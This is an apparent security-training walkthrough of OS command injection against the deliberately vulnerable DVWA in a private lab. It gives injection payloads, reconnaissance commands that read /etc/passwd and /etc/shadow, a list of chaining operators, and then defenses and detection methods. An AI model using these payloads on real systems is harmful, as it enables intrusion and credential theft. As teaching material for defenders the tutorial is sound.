# Command Injection Attack

## What is Command Injection?

Command Injection (also called OS Command Injection) is a vulnerability that allows an attacker to execute arbitrary operating system commands on the server running an application. This occurs when an application passes unsafe user input directly to a system shell. Successful exploitation can lead to complete system compromise, data theft, or service disruption.

## Attack Scenario

* **DVWA Server (Metasploitable):** 192.168.1.5
* **OWASP Server:** 192.168.1.2
* **Attacker IP Address:** 192.168.1.8

## Lab Environment

This lab uses **DVWA (Damn Vulnerable Web Application)** - an intentionally vulnerable web application designed specifically for security training and education.

## How the Attack Works

### Initial Setup

1. **Access DVWA:**
   * Navigate to: `http://192.168.1.5/dvwa/login.php`
   * Default credentials:
     - Username: `admin`
     - Password: `password`

2. **Configure security level:**
   * After login, set DVWA Security to **LOW**
   * Navigate to **Command Injection** from the left menu

3. **Understand the vulnerability:**
   * The application accepts an IP address and performs a ping operation
   * User input is passed directly to the system shell without sanitization

### 1. Basic Command Injection

**Test normal functionality:**
```bash
127.0.0.1
```
This performs a legitimate ping operation.

**Test for vulnerability:**
```bash
127.0.0.1 | whoami
```
The pipe (`|`) operator chains commands. This executes `ping` then `whoami`.

### 2. Multiple Command Execution

**Using the ampersand operator:**
```bash
127.0.0.1 | pwd & whoami & ps
```

**What this does:**
* `pwd` - Prints current working directory
* `whoami` - Shows current user
* `ps` - Lists running processes

**Expected output:**
```
/var/www/dvwa/vulnerabilities/exec
www-data
PID TTY          TIME CMD
1234 ?        00:00:00 apache2
...
```

### 3. System Information Gathering

**Comprehensive system reconnaissance:**
```bash
127.0.0.1 | uname -a & users & id & w
```

**Command breakdown:**
* `uname -a` - Displays system information (kernel, hostname, architecture)
* `users` - Lists logged-in users
* `id` - Shows user and group IDs
* `w` - Displays who is logged in and what they're doing

**Sample output:**
```
Linux metasploitable 2.6.24-16-server #1 SMP i686 GNU/Linux
msfadmin
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 4. Group Information Enumeration

**Display group membership:**
```bash
127.0.0.1 | cat /etc/group
```

**What this reveals:**
* All system groups
* Group members
* Group IDs (GIDs)

**Sample output:**
```
root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:msfadmin
sudo:x:27:msfadmin
www-data:x:33:
```

### 5. User Account Enumeration

**Display user accounts:**
```bash
127.0.0.1 | cat /etc/passwd
```

**Information obtained:**
* Usernames
* User IDs (UIDs)
* Home directories
* Default shells
* System vs. regular users

**Sample output:**
```
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/bin/sh
msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
```

### 6. Additional Reconnaissance Commands

**File system exploration:**
```bash
127.0.0.1 | ls -la /home
127.0.0.1 | cat /etc/shadow 2>&1
127.0.0.1 | find / -name "*.conf" 2>/dev/null
```

**Network information:**
```bash
127.0.0.1 | ifconfig
127.0.0.1 | netstat -an
127.0.0.1 | cat /etc/hosts
```

**Process and service information:**
```bash
127.0.0.1 | ps aux
127.0.0.1 | service --status-all
```

## Command Injection Operators

Different operators can be used to chain commands:

| Operator | Description | Example |
|----------|-------------|---------|
| `;` | Command separator (sequential execution) | `cmd1 ; cmd2` |
| `&` | Background execution | `cmd1 & cmd2` |
| `&&` | AND operator (execute if previous succeeds) | `cmd1 && cmd2` |
| `\|\|` | OR operator (execute if previous fails) | `cmd1 \|\| cmd2` |
| `\|` | Pipe (pass output to next command) | `cmd1 \| cmd2` |
| `` `cmd` `` | Command substitution | `` echo `whoami` `` |
| `$(cmd)` | Command substitution | `echo $(whoami)` |
| `\n` | Newline (in some contexts) | `cmd1%0Acmd2` |

## Common Injection Payloads

```bash
# Windows
& dir
&& dir
| dir
|| dir

# Linux/Unix
; ls -la
& ls -la
&& ls -la
| ls -la
|| ls -la

# Command substitution
`whoami`
$(whoami)

# URL encoded
%0A whoami
%0D%0A whoami
```

## Effects of Command Injection

* **Complete System Compromise:** Execute any command as the web server user
* **Data Exfiltration:** Read sensitive files and databases
* **Privilege Escalation:** Potential to escalate to root/administrator
* **Backdoor Installation:** Deploy persistent access mechanisms
* **Lateral Movement:** Use compromised system to attack others
* **Service Disruption:** Delete files, kill processes, or crash services

## Defense Against Command Injection

### 1. **Input Validation**
```php
// Whitelist approach - only allow specific characters
if (preg_match('/^[0-9.]+$/', $ip)) {
    // Valid IP format
} else {
    // Reject input
}
```

### 2. **Use Safe APIs**
```php
// Bad - vulnerable to injection
system("ping -c 4 " . $ip);

// Good - use language-specific functions
$output = shell_exec(escapeshellarg("ping") . " -c 4 " . escapeshellarg($ip));
```

### 3. **Avoid Shell Execution**
* Use built-in language functions instead of shell commands
* Example: Use PHP's `fsockopen()` instead of system `ping`

### 4. **Principle of Least Privilege**
* Run web applications with minimal permissions
* Use dedicated service accounts
* Restrict file system access

### 5. **Input Sanitization**
```php
// Escape shell arguments
$safe_input = escapeshellarg($user_input);
$safe_cmd = escapeshellcmd($command);
```

### 6. **Web Application Firewall (WAF)**
* Deploy WAF rules to detect command injection patterns
* Block suspicious characters: `;`, `|`, `&`, `$`, backticks

### 7. **Security Monitoring**
* Log all system command executions
* Monitor for unusual process spawning
* Alert on access to sensitive files

## Detection Methods

### Application Level:
* Code review for unsafe function calls: `system()`, `exec()`, `shell_exec()`, `passthru()`
* Static analysis tools to identify vulnerable code patterns

### Network Level:
* Monitor for unusual outbound connections from web servers
* Detect suspicious DNS queries
* Track unexpected file transfers

### System Level:
* Monitor process execution logs
* Track file access patterns
* Alert on privilege escalation attempts
